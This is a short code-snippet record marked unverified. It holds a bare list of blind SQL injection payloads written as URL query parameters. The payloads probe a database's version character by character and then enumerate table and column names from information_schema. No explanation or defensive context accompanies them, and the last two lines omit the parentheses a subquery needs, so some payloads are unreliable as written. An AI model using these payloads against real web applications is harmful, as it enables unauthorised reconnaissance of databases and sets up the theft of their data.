---
id: ee69f169-0491-41d0-a886-86d34ab270c5
type: code
language: SQL
verified: false
created_at: '2023-04-06T03:56:34.556257+00:00'
updated_at: '2023-04-10T20:22:56.996712+00:00'
---

# Code Snippet ee69f169

**Language**: SQL

```sql
?id=1 and substring(version(),1,1)=5
?id=1 and right(left(version(),1),1)=5
?id=1 and left(version(),1)=4
?id=1 and ascii(lower(substr(Version(),1,1)))=51
?id=1 and (select mid(version(),1,1)=4)
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
```
